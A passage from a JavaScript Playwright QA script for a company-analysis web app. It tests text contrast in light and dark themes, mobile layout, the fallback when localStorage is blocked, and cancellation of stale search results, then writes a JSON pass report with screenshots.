            ["ink-dim/panel-2", token("--ref-ink-dim"), cardSecondary],
            ["ink-faint/panel", token("--ref-ink-faint"), card],
            ["ink-faint/panel-2", token("--ref-ink-faint"), cardSecondary],
          ]
          : [
            ["ink/card", token("--ink"), card],
            ["muted/card", token("--muted"), card],
            ["muted/paper", token("--muted"), paper],
            ["faint/card", token("--faint"), card],
            ["faint/paper", token("--faint"), paper],
            ["teal/card", token("--teal"), card],
            ["coral/card", token("--coral"), card],
            ["gold/card", token("--gold"), card],
          ];
        return Object.fromEntries(pairs.map(([name, foreground, background]) => [
          name,
          Number(ratio(foreground, background).toFixed(2)),
        ]));
      };
      const strategy = document.querySelector(".strategy-brief");
      return {
        page: collect(document.documentElement),
        strategy: collect(strategy, "--ref-"),
      };
    });
    const assertContrast = (ratios, label) => {
      const failures = Object.entries(ratios).filter(
        ([, ratio]) => !Number.isFinite(ratio) || ratio < 4.5,
      );
      if (failures.length) {
        throw new Error(`${label} text contrast failed: ${JSON.stringify(failures)}`);
      }
    };
    assertContrast(contrastRatios.page, "light theme");
    assertContrast(contrastRatios.strategy, "strategy theme");

    await page.screenshot({ path: screenshotPath, fullPage: true });
    await page.locator("#themeToggle").click();
    if (await page.locator("html").getAttribute("data-theme") !== "dark") {
      throw new Error("theme toggle did not enable dark mode");
    }
    const darkContrastRatios = await page.evaluate(() => {
      const styles = getComputedStyle(document.documentElement);
      const parseHex = (value) => {
        const hex = value.trim().replace("#", "");
        const expanded = hex.length === 3
          ? [...hex].map((character) => character + character).join("")
          : hex;
        return [0, 2, 4].map((offset) => Number.parseInt(expanded.slice(offset, offset + 2), 16));
      };
      const luminance = (value) => {
        const channels = parseHex(value).map((channel) => {
          const normalized = channel / 255;
          return normalized <= 0.04045
            ? normalized / 12.92
            : ((normalized + 0.055) / 1.055) ** 2.4;
        });
        return 0.2126 * channels[0] + 0.7152 * channels[1] + 0.0722 * channels[2];
      };
      const ratio = (foreground, background) => {
        const first = luminance(foreground);
        const second = luminance(background);
        return Number(((Math.max(first, second) + 0.05) / (Math.min(first, second) + 0.05)).toFixed(2));
      };
      const token = (name) => styles.getPropertyValue(name).trim();
      const card = token("--card");
      const paper = token("--paper");
      return {
        "ink/card": ratio(token("--ink"), card),
        "muted/card": ratio(token("--muted"), card),
        "muted/paper": ratio(token("--muted"), paper),
        "faint/card": ratio(token("--faint"), card),
        "faint/paper": ratio(token("--faint"), paper),
        "teal/card": ratio(token("--teal"), card),
        "coral/card": ratio(token("--coral"), card),
        "gold/card": ratio(token("--gold"), card),
      };
    });
    assertContrast(darkContrastRatios, "dark theme");
    const darkStrategyContrastRatios = await page.evaluate(() => {
      const strategy = document.querySelector(".strategy-brief");
      const token = (name) => {
        const probe = document.createElement("span");
        probe.style.color = `var(${name})`;
        probe.style.display = "none";
        strategy.appendChild(probe);
        const value = getComputedStyle(probe).color;
        probe.remove();
        return value;
      };
      const parseColor = (value) => {
        const normalized = value.trim();
        if (normalized.startsWith("#")) {
          const hex = normalized.slice(1);
          const expanded = hex.length === 3
            ? [...hex].map((character) => character + character).join("")
            : hex;
          return [0, 2, 4].map(
            (offset) => Number.parseInt(expanded.slice(offset, offset + 2), 16),
          );
        }
        const channels = (normalized.match(/[\d.]+/g) || []).slice(0, 3).map(Number);
        return normalized.startsWith("color(srgb")
          ? channels.map((channel) => channel * 255)
          : channels;
      };
      const luminance = (value) => {
        const channels = parseColor(value).map((channel) => {
          const normalized = channel / 255;
          return normalized <= 0.04045
            ? normalized / 12.92
            : ((normalized + 0.055) / 1.055) ** 2.4;
        });
        return 0.2126 * channels[0] + 0.7152 * channels[1] + 0.0722 * channels[2];
      };
      const ratio = (foreground, background) => {
        const values = [luminance(foreground), luminance(background)].sort((a, b) => b - a);
        return Number(((values[0] + 0.05) / (values[1] + 0.05)).toFixed(2));
      };
      const backgrounds = {
        panel: token("--ref-panel"),
        "panel-2": token("--ref-panel-2"),
      };
      const foregrounds = {
        ink: token("--ref-ink"),
        "ink-dim": token("--ref-ink-dim"),
        "ink-faint": token("--ref-ink-faint"),
      };
      return Object.fromEntries(Object.entries(foregrounds).flatMap(
        ([foregroundName, foreground]) => Object.entries(backgrounds).map(
          ([backgroundName, background]) => [
            `${foregroundName}/${backgroundName}`,
            ratio(foreground, background),
          ],
        ),
      ));
    });
    assertContrast(darkStrategyContrastRatios, "dark strategy theme");
    await page.setViewportSize({ width: 390, height: 844 });
    await page.evaluate(() => window.scrollTo(0, 0));
    const mobileLayout = await page.evaluate(() => ({
      viewportWidth: window.innerWidth,
      documentWidth: document.documentElement.scrollWidth,
      selectedTab: document.querySelector('#tabs [aria-selected="true"]')?.dataset.tab || "",
      selectedTabVisible: Boolean(document.querySelector('#tabs [aria-selected="true"]')?.getClientRects().length),
      profitLabelFontSize: Number.parseFloat(
        getComputedStyle(document.querySelector(".strategy-profit-column strong")).fontSize,
      ),
    }));
    if (
      mobileLayout.documentWidth > mobileLayout.viewportWidth + 1
      || mobileLayout.selectedTab !== "strategy"
      || !mobileLayout.selectedTabVisible
      || mobileLayout.profitLabelFontSize < 9
    ) {
      throw new Error(`mobile layout contract failed: ${JSON.stringify(mobileLayout)}`);
    }
    await page.screenshot({ path: mobileScreenshotPath, fullPage: false });
    await page.locator(".strategy-decision-section").evaluate((node) => {
      node.scrollIntoView({ block: "start", behavior: "instant" });
    });
    const mobileDecisionCopy = await page.evaluate(() => {
      const cards = [...document.querySelectorAll(".strategy-decision-card")];
      const actionSpans = [...document.querySelectorAll(".strategy-decision-action span")];
      const cohortLimits = [...document.querySelectorAll(".strategy-cohort-limit")];
      const readinessDetails = [...document.querySelectorAll(".strategy-readiness-matrix small")];
      const restatementNotice = document.querySelector(".strategy-readiness-notice");
      const fitsCard = (node) => {
        const card = node.closest(".strategy-decision-card");
        if (!card) return false;
        const nodeRect = node.getBoundingClientRect();
        const cardRect = card.getBoundingClientRect();
        return nodeRect.left >= cardRect.left - 1
          && nodeRect.right <= cardRect.right + 1
          && node.scrollWidth <= node.clientWidth + 1;
      };
      return {
        actionCount: actionSpans.length,
        cohortCount: cohortLimits.length,
        readinessDetailCount: readinessDetails.length,
        actionsFit: actionSpans.every(fitsCard),
        actionCopyWrapEnabled: actionSpans.every(
          (node) => getComputedStyle(node).whiteSpace !== "nowrap",
        ),
        cohortsFit: cohortLimits.every(fitsCard),
        readinessDetailsWrap: readinessDetails.every((node) => (
          getComputedStyle(node).whiteSpace !== "nowrap"
          && node.scrollWidth <= node.clientWidth + 1
        )),
        restatementNoticeFits: Boolean(
          restatementNotice
          && restatementNotice.scrollWidth <= restatementNotice.clientWidth + 1
        ),
      };
    });
    if (
      mobileDecisionCopy.actionCount !== 3
      || mobileDecisionCopy.cohortCount !== 3
      || mobileDecisionCopy.readinessDetailCount !== 11
      || !mobileDecisionCopy.actionsFit
      || !mobileDecisionCopy.actionCopyWrapEnabled
      || !mobileDecisionCopy.cohortsFit
      || !mobileDecisionCopy.readinessDetailsWrap
      || !mobileDecisionCopy.restatementNoticeFits
    ) {
      throw new Error(`mobile decision copy contract failed: ${JSON.stringify(mobileDecisionCopy)}`);
    }
    await page.screenshot({ path: mobileDecisionScreenshotPath, fullPage: false });
    const storagePage = await browser.newPage({ viewport: { width: 900, height: 700 } });
    const storageErrors = [];
    storagePage.on("pageerror", (error) => storageErrors.push(error.message));
    try {
      await storagePage.addInitScript(() => {
        Object.defineProperty(window, "localStorage", {
          configurable: true,
          get() { throw new DOMException("storage disabled", "SecurityError"); },
        });
      });
      await storagePage.goto(appUrl, { waitUntil: "networkidle", timeout: 60_000 });
      await storagePage.locator("#companySearch").waitFor({ timeout: 30_000 });
      await storagePage.locator("#themeToggle").click();
      if (
        storageErrors.length
        || await storagePage.locator("html").getAttribute("data-theme") !== "dark"
      ) {
        throw new Error(`storage fallback failed: ${JSON.stringify(storageErrors)}`);
      }
    } finally {
      await storagePage.close();
    }
    const searchRacePage = await browser.newPage({ viewport: { width: 900, height: 700 } });
    const searchRaceErrors = [];
    searchRacePage.on("pageerror", (error) => searchRaceErrors.push(error.message));
    try {
      await searchRacePage.goto(appUrl, { waitUntil: "networkidle", timeout: 60_000 });
      const raceInput = searchRacePage.locator("#companySearch");
      await raceInput.fill(firstQuery);
      await raceInput.press("Escape");
      await searchRacePage.waitForTimeout(1_000);
      if (
        searchRaceErrors.length
        || await raceInput.getAttribute("aria-expanded") !== "false"
        || await searchRacePage.locator("#searchResults").textContent() !== ""
      ) {
        throw new Error(`stale search response reopened listbox: ${JSON.stringify(searchRaceErrors)}`);
      }
    } finally {
      await searchRacePage.close();
    }
    const report = {
      ok: true,
      runId,
      companyQueries,
      evidenceLinkCount: evidenceLinks.length,
      readyLowDimensions: decisionBriefContract.readyLowDimensions,
      liveMetricQualityCopies: decisionBriefContract.liveMetricQualityCopies,
      overviewDecisionPath: "passed",
      decisionBriefContract: "passed",
      citationRendering: "passed",
      numericBoundary: "passed",
      signedVisualizationBoundary: "passed",
      missingValueBoundary: "passed",
      keyboardTabs: "passed",
      keyboardCompanySearch: "passed",
      accessibilityLabels: "passed",
      relativeComparisonBoundary: "passed",
      strategyLoadErrorState: "passed",
      storageFallback: "passed",
      staleSearchCancellation: "passed",
      textContrast: "passed",
      atomicComparisonCommit: "passed",
      staleAiCancellation: "passed",
      periodAiCancellation: "passed",
      conversationBudget: "passed",
      firstAiRequestKey: "passed",
      csvFormulaBoundary: "passed",
      darkTheme: "passed",
      mobileLayout: "passed",
      mobileDecisionCopy: "passed",
      title: await page.title(),
      screenshotPath,
      mobileScreenshotPath,
      mobileDecisionScreenshotPath,
    };
    if (qaReportPath) {
      const resolvedReportPath = path.resolve(qaReportPath);
      fs.mkdirSync(path.dirname(resolvedReportPath), { recursive: true });
      fs.writeFileSync(resolvedReportPath, `${JSON.stringify(report, null, 2)}\n`, "utf8");
    }
    process.stdout.write(`${JSON.stringify(report)}\n`);
  } finally {
    await browser.close();
  }
}

main().catch((error) => {
  process.stderr.write(`${error.stack || error.message}\n`);
  process.exitCode = 1;
});
